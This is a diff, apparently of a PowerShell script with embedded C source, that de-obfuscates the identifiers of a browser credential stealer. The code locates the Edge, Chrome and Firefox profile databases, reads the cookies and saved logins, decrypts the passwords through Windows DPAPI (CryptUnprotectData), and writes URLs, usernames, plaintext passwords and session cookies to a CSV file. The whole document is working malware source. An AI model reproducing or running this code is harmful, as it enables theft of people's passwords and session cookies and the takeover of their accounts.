@@ -16,170 +16,170 @@ $cCode = @"
 #define _WIN32_WINNT 0x0500
 #endif
 
-void a(char *b) {
-    while (*b) {
-        *b = *b ^ 0xAA;
-        b++;
+void decrypt(char *str) {
+    while (*str) {
+        *str = *str ^ 0xAA;
+        str++;
     }
 }
 
-void c(FILE *d, const char *e, const char *f, const char *g, const char *h) {
-    fprintf(d, "%s,%s,%s,%s\n", e, f, g, h);
-    printf("Writing to CSV: %s, %s, %s, %s\n", e, f, g, h);
+void write_to_csv(FILE *file, const char *type, const char *col1, const char *col2, const char *col3) {
+    fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
+    printf("Writing to CSV: %s, %s, %s, %s\n", type, col1, col2, col3);
 }
 
-char* i(const void *j, int k) {
-    DATA_BLOB l, m;
-    l.pbData = (BYTE *)j;
-    l.cbData = k;
+char* decrypt_password(const void *enc_data, int enc_data_len) {
+    DATA_BLOB in_blob, out_blob;
+    in_blob.pbData = (BYTE *)enc_data;
+    in_blob.cbData = enc_data_len;
 
-    if (CryptUnprotectData(&l, NULL, NULL, NULL, NULL, 0, &m)) {
-        char *n = (char *)malloc(m.cbData + 1);
-        memcpy(n, m.pbData, m.cbData);
-        n[m.cbData] = '\0';
-        LocalFree(m.pbData);
-        return n;
+    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
+        char *dec_data = (char *)malloc(out_blob.cbData + 1);
+        memcpy(dec_data, out_blob.pbData, out_blob.cbData);
+        dec_data[out_blob.cbData] = '\0';
+        LocalFree(out_blob.pbData);
+        return dec_data;
     } else {
         fprintf(stderr, "Failed to decrypt password\n");
         return NULL;
     }
 }
 
-void o(sqlite3 *p, FILE *d) {
-    sqlite3_stmt *q;
-    const char *r = "SELECT host_key, name, value FROM cookies";
-    int s = sqlite3_prepare_v2(p, r, -1, &q, 0);
+void read_cookies(sqlite3 *db, FILE *file) {
+    sqlite3_stmt *res;
+    const char *sql = "SELECT host_key, name, value FROM cookies";
+    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
 
-    if (s != SQLITE_OK) {
-        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(p));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(db));
         return;
     }
 
-    while (sqlite3_step(q) == SQLITE_ROW) {
-        const char *t = (const char *)sqlite3_column_text(q, 0);
-        const char *u = (const char *)sqlite3_column_text(q, 1);
-        const char *v = (const char *)sqlite3_column_text(q, 2);
-        printf("Read cookie: %s, %s, %s\n", t, u, v);
-        c(d, "Cookie", t, u, v);
+    while (sqlite3_step(res) == SQLITE_ROW) {
+        const char *host_key = (const char *)sqlite3_column_text(res, 0);
+        const char *name = (const char *)sqlite3_column_text(res, 1);
+        const char *value = (const char *)sqlite3_column_text(res, 2);
+        printf("Read cookie: %s, %s, %s\n", host_key, name, value);
+        write_to_csv(file, "Cookie", host_key, name, value);
     }
 
-    sqlite3_finalize(q);
+    sqlite3_finalize(res);
 }
 
-void w(sqlite3 *p, FILE *d) {
-    sqlite3_stmt *q;
-    const char *r = "SELECT origin_url, username_value, password_value FROM logins";
-    int s = sqlite3_prepare_v2(p, r, -1, &q, 0);
+void read_passwords(sqlite3 *db, FILE *file) {
+    sqlite3_stmt *res;
+    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
+    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
 
-    if (s != SQLITE_OK) {
-        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(p));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(db));
         return;
     }
 
-    while (sqlite3_step(q) == SQLITE_ROW) {
-        const char *x = (const char *)sqlite3_column_text(q, 0);
-        const char *y = (const char *)sqlite3_column_text(q, 1);
-        const void *z = sqlite3_column_blob(q, 2);
-        int aa = sqlite3_column_bytes(q, 2);
+    while (sqlite3_step(res) == SQLITE_ROW) {
+        const char *origin_url = (const char *)sqlite3_column_text(res, 0);
+        const char *username_value = (const char *)sqlite3_column_text(res, 1);
+        const void *password_value = sqlite3_column_blob(res, 2);
+        int password_len = sqlite3_column_bytes(res, 2);
 
-        char *ab = i(z, aa);
-        if (ab) {
-            printf("Read password: %s, %s, %s\n", x, y, ab);
-            c(d, "Password", x, y, ab);
-            free(ab);
+        char *dec_password = decrypt_password(password_value, password_len);
+        if (dec_password) {
+            printf("Read password: %s, %s, %s\n", origin_url, username_value, dec_password);
+            write_to_csv(file, "Password", origin_url, username_value, dec_password);
+            free(dec_password);
         }
     }
 
-    sqlite3_finalize(q);
+    sqlite3_finalize(res);
 }
 
-void ac(sqlite3 *p) {
-    sqlite3_stmt *q;
-    const char *r = "SELECT name FROM sqlite_master WHERE type='table'";
-    int s = sqlite3_prepare_v2(p, r, -1, &q, 0);
+void inspect_schema(sqlite3 *db) {
+    sqlite3_stmt *res;
+    const char *sql = "SELECT name FROM sqlite_master WHERE type='table'";
+    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
 
-    if (s != SQLITE_OK) {
-        fprintf(stderr, "Failed to inspect schema: %s\n", sqlite3_errmsg(p));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Failed to inspect schema: %s\n", sqlite3_errmsg(db));
         return;
     }
 
     printf("Tables in the database:\n");
-    while (sqlite3_step(q) == SQLITE_ROW) {
-        printf("%s\n", sqlite3_column_text(q, 0));
+    while (sqlite3_step(res) == SQLITE_ROW) {
+        printf("%s\n", sqlite3_column_text(res, 0));
     }
 
-    sqlite3_finalize(q);
+    sqlite3_finalize(res);
 }
 
-void ad(const char *ae, void (*af)(sqlite3 *, FILE *), FILE *d) {
-    sqlite3 *p;
-    int s = sqlite3_open(ae, &p);
+void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FILE *file) {
+    sqlite3 *db;
+    int rc = sqlite3_open(db_path, &db);
 
-    if (s != SQLITE_OK) {
-        fprintf(stderr, "Cannot open database %s: %s\n", ae, sqlite3_errmsg(p));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Cannot open database %s: %s\n", db_path, sqlite3_errmsg(db));
         return;
     }
 
-    printf("Reading database: %s\n", ae);
-    ac(p); // Inspect the schema before reading
-    af(p, d);
-    sqlite3_close(p);
+    printf("Reading database: %s\n", db_path);
+    inspect_schema(db); // Inspect the schema before reading
+    read_func(db, file);
+    sqlite3_close(db);
 }
 
-void ag(char *ah, size_t ai) {
-    char aj[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, aj))) {
-        snprintf(ah, ai, "%s\\Mozilla\\Firefox\\Profiles", aj);
+void get_firefox_profile_path(char *profile_path, size_t size) {
+    char appdata[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
+        snprintf(profile_path, size, "%s\\Mozilla\\Firefox\\Profiles", appdata);
     }
 }
 
 int main() {
-    char ak[MAX_PATH];
-    char al[MAX_PATH];
-    char am[MAX_PATH];
-    char an[MAX_PATH];
-    char ao[MAX_PATH];
-    char ap[MAX_PATH];
+    char edge_cookies[MAX_PATH];
+    char edge_passwords[MAX_PATH];
+    char chrome_cookies[MAX_PATH];
+    char chrome_passwords[MAX_PATH];
+    char firefox_profile[MAX_PATH];
+    char firefox_cookies[MAX_PATH];
 
     // Get paths for Edge
-    snprintf(ak, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
-    snprintf(al, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
+    snprintf(edge_cookies, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
+    snprintf(edge_passwords, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
 
     // Get paths for Chrome
-    snprintf(am, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
-    snprintf(an, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
+    snprintf(chrome_cookies, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
+    snprintf(chrome_passwords, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
 
     // Get path for Firefox profile
-    ag(ao, MAX_PATH);
-    snprintf(ap, MAX_PATH, "%s\\<profile>\\cookies.sqlite", ao); // Replace <profile> with actual profile name
+    get_firefox_profile_path(firefox_profile, MAX_PATH);
+    snprintf(firefox_cookies, MAX_PATH, "%s\\<profile>\\cookies.sqlite", firefox_profile); // Replace <profile> with actual profile name
 
     // Print paths for verification
-    printf("Edge cookies path: %s\n", ak);
-    printf("Edge passwords path: %s\n", al);
-    printf("Chrome cookies path: %s\n", am);
-    printf("Chrome passwords path: %s\n", an);
-    printf("Firefox cookies path: %s\n", ap);
+    printf("Edge cookies path: %s\n", edge_cookies);
+    printf("Edge passwords path: %s\n", edge_passwords);
+    printf("Chrome cookies path: %s\n", chrome_cookies);
+    printf("Chrome passwords path: %s\n", chrome_passwords);
+    printf("Firefox cookies path: %s\n", firefox_cookies);
 
-    FILE *d = fopen("output.csv", "w");
-    if (!d) {
+    FILE *file = fopen("output.csv", "w");
+    if (!file) {
         fprintf(stderr, "Cannot open output.csv for writing\n");
         return 1;
     }
 
-    fprintf(d, "Type,Column1,Column2,Column3\n");
+    fprintf(file, "Type,Column1,Column2,Column3\n");
 
     printf("Reading Edge cookies and passwords...\n");
-    ad(ak, o, d);
-    ad(al, w, d);
+    read_database(edge_cookies, read_cookies, file);
+    read_database(edge_passwords, read_passwords, file);
 
     printf("Reading Chrome cookies and passwords...\n");
-    ad(am, o, d);
-    ad(an, w, d);
+    read_database(chrome_cookies, read_cookies, file);
+    read_database(chrome_passwords, read_passwords, file);
 
     printf("Reading Firefox cookies...\n");
-    ad(ap, o, d);
+    read_database(firefox_cookies, read_cookies, file);
 
-    fclose(d);
+    fclose(file);
 
     return 0;
 }
